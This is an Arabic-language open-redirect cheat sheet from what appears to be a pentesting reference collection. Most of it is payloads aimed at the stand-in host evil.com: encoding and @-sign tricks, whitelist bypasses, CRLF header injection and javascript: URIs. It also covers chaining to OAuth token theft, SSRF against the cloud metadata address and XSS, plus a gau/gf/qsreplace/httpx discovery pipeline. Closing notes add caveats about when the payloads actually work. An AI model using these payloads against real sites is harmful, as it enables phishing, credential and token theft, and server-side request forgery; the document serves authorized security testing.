<a id="-open-redirect-cheatsheet"></a>
# 🔀 مرجع إعادة التوجيه المفتوحة (Open Redirect)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

<a id="-what-is-open-redirect"></a>
## 🎯 ما إعادة التوجيه المفتوحة؟

تتيح **إعادة التوجيه المفتوحة** للمهاجم توجيه المستخدم إلى موقع خبيث انطلاقًا من رابط على نطاق موثوق، ويمكن استغلالها في التصيد وربطها بثغرات أخرى.

---

<a id="-common-parameters"></a>
## 🔍 معاملات شائعة

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

<a id="-payloads"></a>
## 💉 الحمولات

<a id="basic"></a>
### أساسي
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

<a id="protocol-less"></a>
### عناوين دون تحديد البروتوكول
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

<a id="using--symbol"></a>
### استخدام الرمز @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

<a id="backslash-tricks"></a>
### حيل الشرطة المائلة العكسية
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

<a id="url-encoding"></a>
### ترميز URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

<a id="domain-confusion"></a>
### الخلط بين أسماء النطاقات
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

<a id="null-bytes"></a>
### البايتات الصفرية (NULL)
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

<a id="crlf-injection"></a>
### حقن محارف CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

<a id="javascript-redirect"></a>
### إعادة التوجيه عبر JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="if-whitelist-checked"></a>
### عند التحقق بقائمة سماح
```
# محاولة التجاوز بالنطاق الفرعي
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# محاولة التجاوز بالمسار
https://target.com/https://evil.com
https://target.com//evil.com
```

<a id="if-only-https-allowed"></a>
### عند السماح بـ HTTPS فقط
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

<a id="localhost-tricks"></a>
### حيل المضيف المحلي (Localhost)
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

<a id="-chaining-open-redirects"></a>
## 🔗 ربط إعادة التوجيه المفتوحة بثغرات أخرى

<a id="oauth-token-theft"></a>
### سرقة رموز OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ سرقة رموز OAuth
```

<a id="ssrf-chain"></a>
### الربط مع SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

<a id="xss-chain"></a>
### الربط مع XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

| نوع الحمولة | المثال |
|--------------|---------|
| أساسي | `//evil.com` |
| الرمز @ | `https://target.com@evil.com` |
| الترميز | `https:%2f%2fevil.com` |
| الخلط بين أسماء النطاقات | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

<a id="-tools"></a>
## 🛠️ الأدوات

```bash
# أنماط GF
gau target.com | gf redirect

# اختبار يدوي
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

<a id="-resources"></a>
## 📚 الموارد

- [إعادة التوجيه المفتوحة من PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 استغلّ إعادة التوجيه!</b><br>
  <i>للاختبارات المأذون بها فقط!</i>
</p>

> **مصطلحات:** إعادة التوجيه المفتوحة هي قبول وجهة يتحكم فيها المستخدم بما يسمح بنقله إلى نطاق خارجي دون تحقق مناسب. يستخدم التصيد الرابط الموثوق بوصفه نقطة انطلاق. CRLF محرفا نهاية السطر والرجوع إلى بدايته، وSSRF تزوير طلب من جهة الخادم، وXSS تنفيذ شيفرة في سياق صفحة ويب. حُفظ الرسم الإنجليزي والحمولات حرفيًا للحفاظ على بنيتها.

> **توضيح للحمولات:** هذه قائمة حالات اختبار، وليست عناوين تضمن التجاوز في كل متصفح أوخادم. في `https://target.com@evil.com`، يقع target.com في جزء معلومات المستخدم، والمضيف هو evil.com. أما وجود عنوان خارجي داخل مسار يبدأ بـ target.com فلا يغيّر المضيف وحده. كما أن `evil.target.com` يظل نطاقًا فرعيًا من target.com؛ ولا يُفترض أن المهاجم يتحكم فيه. [مواصفة URL وأجزائه](https://url.spec.whatwg.org/#url-representation). تعتمد أمثلة الشرطات العكسية والترميز وNULL وJavaScript على طريقة التحليل والسياق.

> **توضيح للربط:** لا تؤدي إعادة توجيه المتصفح إلى عنوان داخلي وحدها إلى SSRF من الخادم؛ يتطلب الربط مكوّنًا يجلب العناوين من جهة الخادم ويتبع إعادة التوجيه. [شرح PortSwigger لربط SSRF بإعادة التوجيه](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection). كذلك لا يثبت رابط redirect_uri وحده سرقة رمز OAuth دون تحقق من تدفق المصادقة وقواعد الوجهة. يشرح [مرجع إعادة التوجيه المفتوحة](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) أثرها الأساسي في توجيه المستخدم إلى موقع خارجي.
